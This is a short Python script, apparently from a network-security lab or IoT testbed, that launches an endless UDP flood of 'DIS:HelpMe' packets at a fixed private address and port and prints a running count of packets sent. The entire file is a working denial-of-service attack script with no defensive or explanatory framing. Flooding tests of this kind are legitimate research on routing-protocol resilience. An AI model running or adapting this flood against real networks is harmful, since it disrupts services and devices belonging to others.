import socket
import time
from datetime import datetime

TARGET_IP = "172.20.0.100"
PORT = 9999

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def dis_flood_attack():
    payload = b"DIS:HelpMe"

    print(f"--- LAUNCHING DIS FLOOD ATTACK ON {TARGET_IP} ---")

    packet_count = 0

    while True:
        sock.sendto(payload, (TARGET_IP, PORT))

        packet_count += 1

        if packet_count % 100 == 0:
            now = datetime.now().strftime("%H:%M:%S")
            print(f"[{now}] [ATTACK] Sent {packet_count} DIS packets")


time.sleep(5)
dis_flood_attack()
